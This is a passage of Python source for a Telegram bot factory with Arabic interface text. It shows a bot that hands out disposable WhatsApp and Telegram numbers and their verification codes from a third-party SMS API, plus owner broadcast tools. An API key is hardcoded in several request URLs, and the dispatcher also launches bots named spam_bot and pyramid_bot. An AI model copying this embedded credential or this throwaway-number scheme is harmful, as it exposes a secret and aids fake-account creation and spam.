        elif data == "ViScO10" and user_id == KAMAL_ID:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="🗑️ *أرسل أيدي المستخدم لحذفه من الاشتراك المدفوع:*",
                parse_mode="Markdown",
                reply_markup=telebot.types.InlineKeyboardMarkup().add(
                    telebot.types.InlineKeyboardButton("رجوع ↩️", callback_data="back_to_vip")
                )
            )
            ViScOUP["waiting_for_remove"] = True
            save_json(json_file, ViScOUP)
        
        # الرجوع لقائمة VIP
        elif data == "back_to_vip" and user_id == KAMAL_ID:
            verification_status = "✅ مفعل" if ViScOUP.get("verification", True) else "❎ معطل"
            
            keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                telebot.types.InlineKeyboardButton(
                    "تعطيل التحقق ❎" if ViScOUP["verification"] else "تفعيل التحقق ✅",
                    callback_data="toggle_verification"
                ),
                telebot.types.InlineKeyboardButton("➕ إضافة اشتراك مدفوع", callback_data="ViScO11"),
                telebot.types.InlineKeyboardButton("➖ حذف اشتراك مدفوع", callback_data="ViScO10")
            )
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔐 *إدارة التحقق*\n\nالحالة: {verification_status}",
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        
        # تفعيل حساب
        elif data.startswith("trues|"):
            target_id = int(data.split("|")[1])
            ViScOUP.setdefault("mems", {})[target_id] = 1
            save_json(json_file, ViScOUP)
            
            bot.answer_callback_query(call.id, "✅ تم تفعيل الحساب")
            
            # إرسال رسالة للمستخدم
            try:
                bot.send_message(
                    target_id,
                    "🎉 *تم تفعيل حسابك بنجاح!*\n\n✨ الآن يمكنك استخدام جميع مميزات المصنع.",
                    parse_mode="Markdown"
                )
            except:
                pass
        
        # رفض تفعيل حساب
        elif data.startswith("falses|"):
            target_id = int(data.split("|")[1])
            bot.answer_callback_query(call.id, "❌ تم رفض الطلب")
    
    # تشغيل البوت
    try:
        bot_username = bot.get_me().username
        print(f"✅ Protection bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Protection bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]
                # ==============================================================================
# ⬇️⬇️⬇️ -- دالة تشغيل بوت الأرقام (Numbers Bot) -- ⬇️⬇️⬇️
# ==============================================================================
def run_numbers_bot(token, owner_id, data_dir):
    """
    تشغيل بوت الأرقام (بوت الحصول على أرقام واتساب وتليجرام)
    """
    import telebot
    import json
    import requests
    import os
    import time
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # ملفات التخزين
    id_file = os.path.join(data_dir, 'id.txt')
    rembo_file = os.path.join(data_dir, 'rembo.txt')
    tnb_file = os.path.join(data_dir, 'tnb.txt')
    vip_file = os.path.join(data_dir, 'vip.txt')
    vip123_file = os.path.join(data_dir, 'vip123.txt')
    bot1_file = os.path.join(data_dir, 'bot1.txt')
    
    def get_file_content(filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return f.read().strip()
        except:
            return ''
    
    def save_file(filename, content, append=False):
        try:
            mode = 'a' if append else 'w'
            with open(filename, mode, encoding='utf-8') as f:
                f.write(str(content))
            return True
        except:
            return False
    
    def delete_file(filename):
        try:
            if os.path.exists(filename):
                os.remove(filename)
                return True
        except:
            pass
        return False
    
    # إنشاء الملفات إذا لم تكن موجودة
    def init_files():
        files = [id_file, rembo_file, tnb_file, vip_file, vip123_file, bot1_file]
        for file in files:
            if not os.path.exists(file):
                with open(file, 'w', encoding='utf-8') as f:
                    f.write('')
    
    init_files()
    
    # التحقق من الاشتراك في القناة
    def check_subscription(user_id):
        try:
            # يمكنك تغيير @OP_J77 إلى قناتك المطلوبة
            channel_username = "@zxgbjji"
            member = bot.get_chat_member(channel_username, user_id)
            return member.status in ['member', 'administrator', 'creator']
        except Exception as e:
            print(f"Subscription check error: {e}")
            return True  # في حالة الخطأ، نعود true لتجنب حظر المستخدمين
    
    @bot.message_handler(commands=['start'])
    def handle_start(message):
        try:
            user_id = message.from_user.id
            text = message.text or ""
            
            # تحميل البيانات
            get = get_file_content(id_file)
            ex1 = get.split("\n") if get else []
            jo = get_file_content(tnb_file)
            vip = get_file_content(vip_file)
            
            # التحقق من الاشتراك
            if not check_subscription(user_id):
                kb = telebot.types.InlineKeyboardMarkup()
                kb.add(
                    telebot.types.InlineKeyboardButton("اشترك هنا", url="https://t.me/zxgbjji")
                )
                bot.send_message(
                    message.chat.id,
                    "🔒 أهلاً بك في بوت الأرقام!\n\nعليك الاشتراك أولاً في قناة التحديثات لتمكن من استخدام البوت.",
                    reply_markup=kb
                )
                return
            
            # إضافة المستخدم الجديد
            if str(user_id) not in ex1 and jo == 'on':
                save_file(id_file, f"{user_id}\n", append=True)
                bot.send_message(
                    owner_id,
                    f"✅ تم انضمام شخص جديد لبوتنا\n👤 المستخدم: {message.from_user.first_name}\n🆔 الأيدي: {user_id}"
                )
            
            # واجهة المالك
            if str(user_id) == str(owner_id):
                kb = telebot.types.InlineKeyboardMarkup(row_width=2)
                kb.add(
                    telebot.types.InlineKeyboardButton("👥 المشتركين", callback_data="m1"),
                    telebot.types.InlineKeyboardButton("📮 إذاعة رسالة", callback_data="m2"),
                    telebot.types.InlineKeyboardButton("🔄 توجيه رسالة", callback_data="m3"),
                    telebot.types.InlineKeyboardButton("✅ تفعيل التنبيه", callback_data="m4"),
                    telebot.types.InlineKeyboardButton("❌ تعطيل التنبيه", callback_data="m5"),
                    telebot.types.InlineKeyboardButton("💰 وضع المدفوع", callback_data="m6"),
                    telebot.types.InlineKeyboardButton("🆓 وضع المجاني", callback_data="m7"),
                    telebot.types.InlineKeyboardButton("➕ إضافة عضو مدفوع", callback_data="m8"),
                    telebot.types.InlineKeyboardButton("➖ حذف عضو مدفوع", callback_data="m9")
                )
                
                bot.send_message(
                    message.chat.id,
                    "👑 *مرحباً بك يا مالك البوت!*\n\n"
                    "✨ *التحكم الكامل في البوت:*\n"
                    "• إدارة المشتركين والتحكم بهم\n"
                    "• إرسال إذاعات ورسائل موجهة\n"
                    "• ضبط إعدادات الاشتراك الإجباري\n"
                    "• تفعيل أو تعطيل التنبيهات\n"
                    "• إدارة حالة البوت ووضع الاشتراك",
                    parse_mode="Markdown",
                    reply_markup=kb
                )
                return
            
            # واجهة المستخدم العادي
            if vip != 'on':
                kb = telebot.types.InlineKeyboardMarkup(row_width=2)
                kb.add(
                    telebot.types.InlineKeyboardButton("📱 أرقام واتساب", callback_data="home"),
                    telebot.types.InlineKeyboardButton("📞 أرقام تليجرام", callback_data="home1")
                )
                kb.row(
                    telebot.types.InlineKeyboardButton("👨‍💻 تواصل", url=f"tg://user?id={owner_id}"),
                    telebot.types.InlineKeyboardButton("📢 قناة التحديثات", url="https://t.me/zxgbjji")
                )
                
                bot.send_message(
                    message.chat.id,
                    "🌟 *أهلاً بك في بوت الأرقام المجانية!*\n\n"
                    "✨ *المميزات المتاحة:*\n"
                    "• الحصول على أرقام واتساب مجانية\n"
                    "• الحصول على أرقام تليجرام مجانية\n"
                    "• دعم متعدد الدول\n"
                    "• تحديثات مستمرة\n\n"
                    "⚡ *اختر الخدمة التي تريدها:*",
                    parse_mode="Markdown",
                    reply_markup=kb
                )
            else:
                # وضع المدفوع مفعل
                kb = telebot.types.InlineKeyboardMarkup()
                kb.add(
                    telebot.types.InlineKeyboardButton("💰 شراء الاشتراك", url=f"tg://user?id={owner_id}")
                )
                
                bot.send_message(
                    message.chat.id,
                    "🔒 *البوت في الوضع المدفوع حالياً*\n\n"
                    "للاستفادة من جميع ميزات البوت المتقدمة، يُرجى شراء الاشتراك.\n\n"
                    "✨ *مميزات الاشتراك:*\n"
                    "• أرقام غير محدودة\n"
                    "• دعم فني مباشر\n"
                    "• تحديثات أولوية\n"
                    "• مميزات حصرية",
                    parse_mode="Markdown",
                    reply_markup=kb
                )
                
        except Exception as e:
            print(f"Error in start handler: {e}")
            try:
                bot.send_message(message.chat.id, "❌ حدث خطأ. حاول مرة أخرى.")
            except:
                pass
    
    @bot.callback_query_handler(func=lambda call: True)
    def handle_callbacks(call):
        try:
            user_id = call.from_user.id
            data = call.data
            
            # أزرار المالك
            if str(user_id) == str(owner_id):
                # قائمة المشتركين
                if data == 'm1':
                    get = get_file_content(id_file)
                    ex1 = get.split("\n") if get else []
                    users_count = len([x for x in ex1 if x.strip()])
                    
                    bot.answer_callback_query(
                        call.id,
                        f"عدد المشتركين: {users_count}",
                        show_alert=True
                    )
                    return
                
                # إذاعة رسالة
                elif data == 'm2':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="📤 *أرسل الرسالة الآن للإذاعة:*\n\nسيتم إرسالها لجميع المشتركين.",
                        parse_mode="Markdown",
                        reply_markup=telebot.types.InlineKeyboardMarkup().add(
                            telebot.types.InlineKeyboardButton("الغاء", callback_data="back")
                        )
                    )
                    save_file(rembo_file, 'send')
                    return
                
                # توجيه رسالة
                elif data == 'm3':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="🔄 *أرسل الرسالة الآن للتوجيه:*\n\nسيتم توجيهها لجميع المشتركين.",
                        parse_mode="Markdown"
                    )
                    save_file(rembo_file, 'forward')
                    return
                
                # تفعيل التنبيه
                elif data == 'm4':
                    save_file(tnb_file, 'on')
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="✅ *تم تفعيل التنبيهات بنجاح*\n\nسيتم إشعارك بانضمام الأعضاء الجدد.",
                        parse_mode="Markdown",
                        reply_markup=telebot.types.InlineKeyboardMarkup().add(
                            telebot.types.InlineKeyboardButton("رجوع", callback_data="back")
                        )
                    )
                    return
                
                # تعطيل التنبيه
                elif data == 'm5':
                    delete_file(tnb_file)
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="❌ *تم تعطيل التنبيهات بنجاح*\n\nلن يتم إشعارك بانضمام الأعضاء الجدد.",
                        parse_mode="Markdown",
                        reply_markup=telebot.types.InlineKeyboardMarkup().add(
                            telebot.types.InlineKeyboardButton("رجوع", callback_data="back")
                        )
                    )
                    return
                
                # وضع المدفوع
                elif data == 'm6':
                    save_file(vip_file, 'on')
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="💰 *تم تفعيل الوضع المدفوع بنجاح*\n\nالبوت الآن متاح للمشتركين المدفوعين فقط.",
                        parse_mode="Markdown",
                        reply_markup=telebot.types.InlineKeyboardMarkup().add(
                            telebot.types.InlineKeyboardButton("رجوع", callback_data="back")
                        )
                    )
                    return
                
                # وضع المجاني
                elif data == 'm7':
                    delete_file(vip_file)
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="🆓 *تم تفعيل الوضع المجاني بنجاح*\n\nالبوت الآن متاح للجميع.",
                        parse_mode="Markdown",
                        reply_markup=telebot.types.InlineKeyboardMarkup().add(
                            telebot.types.InlineKeyboardButton("رجوع", callback_data="back")
                        )
                    )
                    return
                
                # إضافة عضو مدفوع
                elif data == 'm8':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="➕ *أرسل أيدي العضو لإضافته للمشتركين المدفوعين:*",
                        parse_mode="Markdown",
                        reply_markup=telebot.types.InlineKeyboardMarkup().add(
                            telebot.types.InlineKeyboardButton("الغاء", callback_data="back")
                        )
                    )
                    save_file(rembo_file, 'pro123')
                    return
                
                # حذف عضو مدفوع
                elif data == 'm9':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="➖ *أرسل أيدي العضو لحذفه من المشتركين المدفوعين:*",
                        parse_mode="Markdown",
                        reply_markup=telebot.types.InlineKeyboardMarkup().add(
                            telebot.types.InlineKeyboardButton("الغاء", callback_data="back")
                        )
                    )
                    save_file(rembo_file, 'frre123')
                    return
                
                # زر الرجوع
                elif data == 'back':
                    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
                    kb.add(
                        telebot.types.InlineKeyboardButton("👥 المشتركين", callback_data="m1"),
                        telebot.types.InlineKeyboardButton("📮 إذاعة رسالة", callback_data="m2"),
                        telebot.types.InlineKeyboardButton("🔄 توجيه رسالة", callback_data="m3"),
                        telebot.types.InlineKeyboardButton("✅ تفعيل التنبيه", callback_data="m4"),
                        telebot.types.InlineKeyboardButton("❌ تعطيل التنبيه", callback_data="m5"),
                        telebot.types.InlineKeyboardButton("💰 وضع المدفوع", callback_data="m6"),
                        telebot.types.InlineKeyboardButton("🆓 وضع المجاني", callback_data="m7"),
                        telebot.types.InlineKeyboardButton("➕ إضافة عضو مدفوع", callback_data="m8"),
                        telebot.types.InlineKeyboardButton("➖ حذف عضو مدفوع", callback_data="m9")
                    )
                    
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="👑 *مرحباً بك يا مالك البوت!*\n\n"
                        "✨ *التحكم الكامل في البوت:*\n"
                        "• إدارة المشتركين والتحكم بهم\n"
                        "• إرسال إذاعات ورسائل موجهة\n"
                        "• ضبط إعدادات الاشتراك الإجباري\n"
                        "• تفعيل أو تعطيل التنبيهات\n"
                        "• إدارة حالة البوت ووضع الاشتراك",
                        parse_mode="Markdown",
                        reply_markup=kb
                    )
                    delete_file(rembo_file)
                    return
            
            # واجهة المستخدمين
            # زر العودة الرئيسي
            if data == "ViSCO":
                kb = telebot.types.InlineKeyboardMarkup(row_width=2)
                kb.add(
                    telebot.types.InlineKeyboardButton("📱 أرقام واتساب", callback_data="home"),
                    telebot.types.InlineKeyboardButton("📞 أرقام تليجرام", callback_data="home1")
                )
                kb.row(
                    telebot.types.InlineKeyboardButton("👨‍💻 تواصل", url=f"tg://user?id={owner_id}"),
                    telebot.types.InlineKeyboardButton("📢 قناة التحديثات", url="https://t.me/zxgbjji")
                )
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text="🌟 *أهلاً بك في بوت الأرقام المجانية!*\n\n"
                    "✨ *المميزات المتاحة:*\n"
                    "• الحصول على أرقام واتساب مجانية\n"
                    "• الحصول على أرقام تليجرام مجانية\n"
                    "• دعم متعدد الدول\n"
                    "• تحديثات مستمرة\n\n"
                    "⚡ *اختر الخدمة التي تريدها:*",
                    parse_mode="Markdown",
                    reply_markup=kb
                )
            
            # أرقام واتساب
            elif data == "home":
                kb = telebot.types.InlineKeyboardMarkup(row_width=2)
                kb.add(
                    telebot.types.InlineKeyboardButton("🇾🇪 اليمن", callback_data="buy1"),
                    telebot.types.InlineKeyboardButton("🇷🇺 روسيا", callback_data="buy2"),
                    telebot.types.InlineKeyboardButton("🇺🇸 الولايات المتحدة", callback_data="buy3"),
                    telebot.types.InlineKeyboardButton("🇸🇦 السعودية", callback_data="buy4"),
                    telebot.types.InlineKeyboardButton("🇳🇬 نيجيريا", callback_data="buy5"),
                    telebot.types.InlineKeyboardButton("🔙 رجوع", callback_data="ViSCO")
                )
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text="📱 *أرقام واتساب المجانية*\n\n"
                    "✨ *اختر الدولة:*\n"
                    "• اليمن 🇾🇪\n"
                    "• روسيا 🇷🇺\n" 
                    "• الولايات المتحدة 🇺🇸\n"
                    "• السعودية 🇸🇦\n"
                    "• نيجيريا 🇳🇬\n\n"
                    "⚡ *اختر الدولة:*",
                    parse_mode="Markdown",
                    reply_markup=kb
                )
            
            # أرقام تليجرام
            elif data == "home1":
                kb = telebot.types.InlineKeyboardMarkup()
                kb.add(
                    telebot.types.InlineKeyboardButton("🇷🇴 رومانيا", callback_data="tg1"),
                    telebot.types.InlineKeyboardButton("🔙 رجوع", callback_data="ViSCO")
                )
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text="📞 *أرقام تليجرام المجانية*\n\n"
                    "✨ *الدول المتاحة:*\n"
                    "• رومانيا 🇷🇴\n\n"
                    "⚡ *اختر الدولة:*",
                    parse_mode="Markdown",
                    reply_markup=kb
                )
            
            # طلب رقم واتساب
            elif data in ["buy1", "buy2", "buy3", "buy4", "buy5"]:
                country_map = {
                    "buy1": {"country": "yem", "name": "اليمن 🇾🇪"},
                    "buy2": {"country": "ru", "name": "روسيا 🇷🇺"},
                    "buy3": {"country": "uk", "name": "الولايات المتحدة 🇺🇸"},
                    "buy4": {"country": "su", "name": "السعودية 🇸🇦"},
                    "buy5": {"country": "ng", "name": "نيجيريا 🇳🇬"}
                }
                
                country_info = country_map[data]
                
                try:
                    url = f"https://plussms.shop/api/tele/GetNumber.php?key=TvVLMDimioHhQ9bb4Bd3IDRFtaZ1cdqhQuhvOK9z&from_id=ARAB_TEAM&country={country_info['country']}&app=wa"
                    response = requests.get(url, timeout=10)
                    api_data = response.json()
                    
                    if api_data and 'number' in api_data:
                        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
                        kb.add(
                            telebot.types.InlineKeyboardButton("🔐 طلب الكود", callback_data=f"GetCode_{api_data['number']}"),
                            telebot.types.InlineKeyboardButton("🔄 تغيير الرقم", callback_data=data)
                        )
                        kb.row(
                            telebot.types.InlineKeyboardButton("🔙 رجوع", callback_data="home")
                        )
                        kb.row(
                            telebot.types.InlineKeyboardButton("👨‍💻 تواصل", url=f"tg://user?id={owner_id}")
                        )
                        
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=f"✅ *تم الحصول على رقم جديد!*\n\n"
                            f"🌍 *الدولة:* {country_info['name']}\n"
                            f"📱 *الرقم:* +{api_data['number']}\n"
                            f"⏰ *الحالة:* في انتظار الكود\n\n"
                            f"✨ *اضغط على 'طلب الكود' لاستلام رمز التحقق*",
                            parse_mode="Markdown",
                            reply_markup=kb
                        )
                    else:
                        bot.answer_callback_query(
                            call.id,
                            "❌ لا توجد أرقام متاحة حالياً. حاول لاحقاً.",
                            show_alert=True
                        )
                        
                except Exception as e:
                    print(f"Error getting number: {e}")
                    bot.answer_callback_query(
                        call.id,
                        "❌ حدث خطأ في الخادم. حاول مرة أخرى.",
                        show_alert=True
                    )
            
            # طلب رقم تليجرام
            elif data == "tg1":
                try:
                    url = "https://plussms.shop/api/tele/GetNumber.php?key=TvVLMDimioHhQ9bb4Bd3IDRFtaZ1cdqhQuhvOK9z&from_id=ARAB_TEAM&country=rom&app=tg"
                    response = requests.get(url, timeout=10)
                    api_data = response.json()
                    
                    if api_data and 'number' in api_data:
                        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
                        kb.add(
                            telebot.types.InlineKeyboardButton("🔐 طلب الكود", callback_data=f"GetCode_{api_data['number']}"),
                            telebot.types.InlineKeyboardButton("🔄 تغيير الرقم", callback_data=data)
                        )
                        kb.row(
                            telebot.types.InlineKeyboardButton("🔙 رجوع", callback_data="home1")
                        )
                        kb.row(
                            telebot.types.InlineKeyboardButton("👨‍💻 تواصل", url=f"tg://user?id={owner_id}")
                        )
                        
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=f"✅ *تم الحصول على رقم جديد!*\n\n"
                            f"🌍 *الدولة:* رومانيا 🇷🇴\n"
                            f"📱 *الرقم:* +{api_data['number']}\n"
                            f"⏰ *الحالة:* في انتظار الكود\n\n"
                            f"✨ *اضغط على 'طلب الكود' لاستلام رمز التحقق*",
                            parse_mode="Markdown",
                            reply_markup=kb
                        )
                    else:
                        bot.answer_callback_query(
                            call.id,
                            "❌ لا توجد أرقام متاحة حالياً. حاول لاحقاً.",
                            show_alert=True
                        )
                        
                except Exception as e:
                    print(f"Error getting telegram number: {e}")
                    bot.answer_callback_query(
                        call.id,
                        "❌ حدث خطأ في الخادم. حاول مرة أخرى.",
                        show_alert=True
                    )
            
            # طلب الكود
            elif data.startswith("GetCode_"):
                number = data.split("_")[1]
                
                try:
                    url = f"https://plussms.shop/api/tele/GetSms.php?key=TvVLMDimioHhQ9bb4Bd3IDRFtaZ1cdqhQuhvOK9z&from_id=ARAB_TEAM&number={number}"
                    response = requests.get(url, timeout=10)
                    api_data = response.json()
                    
                    if api_data and api_data.get('otp'):
                        kb = telebot.types.InlineKeyboardMarkup()
                        kb.add(
                            telebot.types.InlineKeyboardButton("👨‍💻 تواصل", url=f"tg://user?id={owner_id}")
                        )
                        
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=f"✅ *تم استلام الكود!*\n\n"
                            f"📱 *الرقم:* +{number}\n"
                            f"🔐 *الكود:* {api_data['otp']}\n"
                            f"⏰ *الوقت:* {api_data.get('time', 'N/A')}\n"
                            f"📦 *الخدمة:* {api_data.get('service', 'N/A')}\n"
                            f"🌍 *الدولة:* {api_data.get('country', 'N/A')}\n\n"
                            f"⚠️ *تنبيه:*\n"
                            f"• لا تشارك هذا الكود مع أي شخص\n"
                            f"• الكود ساري لفترة محدودة\n"
                            f"• يمكنك طلب كود جديد إذا انتهت صلاحية هذا الكود",
                            parse_mode="Markdown",
                            reply_markup=kb
                        )
                    else:
                        bot.answer_callback_query(
                            call.id,
                            "⏳ الكود لم يصل بعد. حاول مرة أخرى بعد قليل.",
                            show_alert=True
                        )
                        
                except Exception as e:
                    print(f"Error getting code: {e}")
                    bot.answer_callback_query(
                        call.id,
                        "❌ حدث خطأ في الخادم. حاول مرة أخرى.",
                        show_alert=True
                    )
                    
        except Exception as e:
            print(f"Error in callback handler: {e}")
            try:
                bot.answer_callback_query(call.id, "❌ حدث خطأ. حاول مرة أخرى.")
            except:
                pass
    
    @bot.message_handler(func=lambda message: True)
    def handle_messages(message):
        try:
            user_id = message.from_user.id
            text = message.text or ""
            
            # التحقق إذا كان المالك
            if str(user_id) == str(owner_id):
                # تحميل حالة العمليات
                send = get_file_content(rembo_file)
                
                # الإذاعة
                if send == 'send':
                    # تحميل المشتركين
                    get = get_file_content(id_file)
                    ex1 = get.split("\n") if get else []
                    
                    success_count = 0
                    fail_count = 0
                    
                    for user in ex1:
                        if user.strip():
                            try:
                                bot.send_message(user.strip(), text)
                                success_count += 1
                            except:
                                fail_count += 1
                    
                    bot.send_message(
                        user_id,
                        f"📊 *تم إرسال الإذاعة:*\n\n"
                        f"✅ *نجاح:* {success_count}\n"
                        f"❌ *فشل:* {fail_count}\n"
                        f"📝 *المجموع:* {success_count + fail_count}",
                        parse_mode="Markdown"
                    )
                    delete_file(rembo_file)
                
                # التوجيه
                elif send == 'forward' and message:
                    get = get_file_content(id_file)
                    ex1 = get.split("\n") if get else []
                    
                    success_count = 0
                    fail_count = 0
                    
                    for user in ex1:
                        if user.strip():
                            try:
                                bot.forward_message(
                                    chat_id=user.strip(),
                                    from_chat_id=message.chat.id,
                                    message_id=message.message_id
                                )
                                success_count += 1
                            except:
                                fail_count += 1
                    
                    bot.send_message(
                        user_id,
                        f"📊 *تم توجيه الرسالة:*\n\n"
                        f"✅ *نجاح:* {success_count}\n"
                        f"❌ *فشل:* {fail_count}\n"
                        f"📝 *المجموع:* {success_count + fail_count}",
                        parse_mode="Markdown"
                    )
                    delete_file(rembo_file)
                
                # إضافة عضو مدفوع
                elif send == 'pro123':
                    if text.isdigit():
                        save_file(vip123_file, f"{text}\n", append=True)
                        bot.send_message(
                            user_id,
                            f"✅ *تم إضافة العضو للاشتراك المدفوع:*\n🆔 {text}",
                            parse_mode="Markdown"
                        )
                    delete_file(rembo_file)
                
                # حذف عضو مدفوع
                elif send == 'frre123':
                    if text.isdigit():
                        current_content = get_file_content(vip123_file)
                        new_content = current_content.replace(f"{text}\n", "")
                        save_file(vip123_file, new_content)
                        bot.send_message(
                            user_id,
                            f"✅ *تم حذف العضو من الاشتراك المدفوع:*\n🆔 {text}",
                            parse_mode="Markdown"
                        )
                    delete_file(rembo_file)
                    
        except Exception as e:
            print(f"Error in message handler: {e}")
    
    try:
        bot_username = bot.get_me().username
        print(f"✅ Numbers bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Numbers bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]
if __name__ == "__main__":
    # حذف جميع الويب هووكات أولاً
    delete_all_webhooks()
    
    print("🔄 Restarting created bots...")
    all_bots = get_all_bots()
    for token, data in all_bots.items():
        owner_id = data.get('owner_id')
        bot_type = data.get('type', 'index') # افتراضيًا 'index' للبوتات القديمة
        bot_data_dir = os.path.join(BOTS_DATA_DIR, token.replace(":", "_"))
        if not os.path.exists(bot_data_dir): os.makedirs(bot_data_dir)
        
        thread = None
        if bot_type == "index":
            thread = threading.Thread(target=run_new_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "token_info":
            thread = threading.Thread(target=run_token_info_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "roulette":
            thread = threading.Thread(target=run_roulette_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "website_builder":
            thread = threading.Thread(target=run_website_builder_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "token_manager":
            thread = threading.Thread(target=run_token_manager_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "writing_paper":
            thread = threading.Thread(target=run_writing_paper_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "interaction_bot":  
            thread = threading.Thread(target=run_interaction_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "encryption_bot":  
            thread = threading.Thread(target=run_encryption_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "spam_bot":  
            thread = threading.Thread(target=run_spam_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "website_downloader": 
            thread = threading.Thread(target=run_website_downloader_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "hosting_bot":
            thread = threading.Thread(target=run_hosting_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        elif bot_type == "pyramid_bot":
            thread = threading.Thread(target=run_pyramid_bot, args=(token, owner_id, bot_data_dir), daemon=True)
        
        if thread:
            thread.start()
            running_bot_threads[token] = thread
    
    print(f"✅ Bot factory is running... Started {len(all_bots)} bots.")
    
    try:
        factory_bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Factory bot error: {e}")